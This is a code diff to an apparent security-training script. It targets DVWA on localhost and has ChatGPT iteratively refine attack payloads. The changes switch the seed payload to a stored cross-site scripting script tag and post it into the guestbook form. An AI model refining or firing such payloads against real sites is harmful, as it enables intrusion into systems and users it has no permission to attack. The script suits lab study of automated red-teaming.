@@ -7,6 +7,7 @@ This script is for for training purposes only
 import requests
 import sys
 import os
+
 current_dir = os.path.dirname(os.path.abspath(__file__))
 class_dir = os.path.join(current_dir, "..", "class")
 sys.path.append(class_dir)
@@ -21,32 +22,36 @@ class PointlessAI_testing_and_refinement(DVWA_Session, ChatGPT_Func, General_Fun
         ChatGPT_Func.__init__(self)
         General_Func.__init__(self)
 
-    def test_payload_effectiveness(self, session, payload, url):
-        """
-        Tests custom payloads in a controlled environment (DVWA).
-        """
-        response = session.post(url, data={"input": payload})
-        return "Success" in response.text
+    def test_payload_effectiveness(self, s, payload, url):
+        # Tests custom payloads in a controlled environment (DVWA).
+
+        payload_data = {
+            'txtName': 'Thankyou for your session id',
+            'mtxMessage': payload,
+            'btnSign': 'Sign+Guestbook'
+        }
+        response = s.post(url, data = payload_data)
+        print(response.text)
+        return "apache2" in response.text
 
     def refine_payload_with_chatgpt(self, initial_payload, test_results):
         """
         Analyzes test results and interacts with ChatGPT to refine payloads.
         """
-        refined_payload_prompt = f"Refine this payload for greater effectiveness based on test results: {initial_payload}. Test results: {test_results}"
+        refined_payload_prompt = f"Refine this payload for greater effectiveness based on test results: {initial_payload}. Test results: {test_results}. Target is always 'http://127.0.0.1/phpinfo.php'"
         refined_payload = self.red_team_query(refined_payload_prompt, self.no_markdown)
         return refined_payload
 
-    def continuous_improvement_feedback_loop(self, session, url, payload):
-        """
-        Uses feedback loops to continuously improve payload design and effectiveness.
-        """
-        test_result = self.test_payload_effectiveness(session, payload, url)
+    def continuous_improvement_feedback_loop(self, s, url, payload):
+        # Uses feedback loops to continuously improve payload design and effectiveness.
+        test_result = self.test_payload_effectiveness(s, payload, url)
+        print(test_result)
         iteration_counter = 0
         while not test_result and iteration_counter < 5:
             iteration_counter += 1
             refinement_suggestions = self.refine_payload_with_chatgpt(payload, test_result)
             payload = refinement_suggestions
-            test_result = self.test_payload_effectiveness(session, payload, url)
+            test_result = self.test_payload_effectiveness(s, payload, url)
             print(f"Iteration {iteration_counter}, Payload refined to: {payload}")
         return payload
 
@@ -57,8 +62,11 @@ class PointlessAI_testing_and_refinement(DVWA_Session, ChatGPT_Func, General_Fun
         with requests.Session() as s:
             user_token, cookies = self.get_csrf_token_and_cookie(s, self.login_url)
             _ = self.login_to_dvwa(s, self.login_url, "admin", "password", user_token)
-            initial_payload = "SELECT * FROM users"
-            url = self.sql_injection
+            user_token, cookies = self.get_csrf_token_and_cookie(s, self.base_url+"/setup.php")
+            _ = self.setup_database(s, self.base_url+"/setup.php", user_token, cookies)
+
+            initial_payload = "<script>redirect('http://127.0.0.1/phpinfo.php');</script>"
+            url = "http://127.0.0.1/vulnerabilities/xss_s/"
             final_payload = self.continuous_improvement_feedback_loop(s, url, initial_payload)
             print(f"Final refined payload: {final_payload}")
 
